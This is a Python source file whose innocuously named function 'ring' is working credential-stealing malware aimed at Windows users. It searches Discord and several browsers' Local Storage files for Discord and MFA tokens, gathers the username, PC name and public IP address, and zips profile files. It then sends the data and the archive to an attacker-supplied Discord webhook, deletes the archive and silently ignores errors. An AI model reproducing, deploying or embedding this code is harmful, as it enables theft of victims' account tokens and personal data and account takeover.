import os
import re
import json
import requests
import zipfile


def ring(*args):
	if len(args)>=2:
		if args[0].isdigit():
			hook_id = int(args[0])
			hook_token = args[1]
		else:
			hook_id = int(args[1])
			hook_token = args[0]

		def find_tokens(place, path):
			path += '\\Local Storage\\leveldb'
			tokens = []
			for file_name in os.listdir(path):
				if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
					continue

				for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
					for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
						for token in re.findall(regex, line):
							tokens.append(token)
			ret = f'{place}: {tokens}'
			return ret

		user = os.getenv('username')
		pc_name = os.environ['COMPUTERNAME']
		local = os.getenv('LOCALAPPDATA')
		roaming = os.getenv('APPDATA')
		temp = local + '\\temp\\'

		paths = {
			'Discord': roaming + '\\Discord',
			'Discord Canary': roaming + '\\discordcanary',
			'Discord PTB': roaming + '\\discordptb',
			'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
			'Opera': roaming + '\\Opera Software\\Opera Stable',
			'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
			'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
			}
			
		tokens_separated = []
		for place, path in paths.items():
			try:
				tokens_separated.append(find_tokens(place, path))
			except Exception:
				pass

		zipf = temp + 'main.zip'
		zip = zipfile.ZipFile(zipf,'a')
		try:
			ip = requests.get('https://api.ipify.org').text
		except Exception:
			ip = 'ip not found'

		for place, path in paths.items():
			try:
				for root, dirs, files in os.walk(path):
					for file in files:
						zip.write(path+file)
			except Exception:
				pass
		zip.close()
		try:
			data = {}
			data['content'] =  f'```css\nToken Grabbed! \n\nUsername: {str(user)}\nPC Name: {pc_name}\nIP Address: {ip}\n{str(tokens_separated)}\nZip File:```'
			requests.post(f'https://discord.com/api/webhooks/{hook_id}/{hook_token}', data=json.dumps(data), headers={'content-type': 'application/json'})
		except Exception:
			pass
		try:
			fin = open(zipf, 'rb')
			files = {'file': fin}
			try:
				requests.post(f'https://discord.com/api/webhooks/{hook_id}/{hook_token}', files=files)
			except Exception:
				pass
		except Exception:
			pass

		try:
			os.remove(zipf)
		except Exception:
			pass
		return args[-1]
		
	else:
		return False
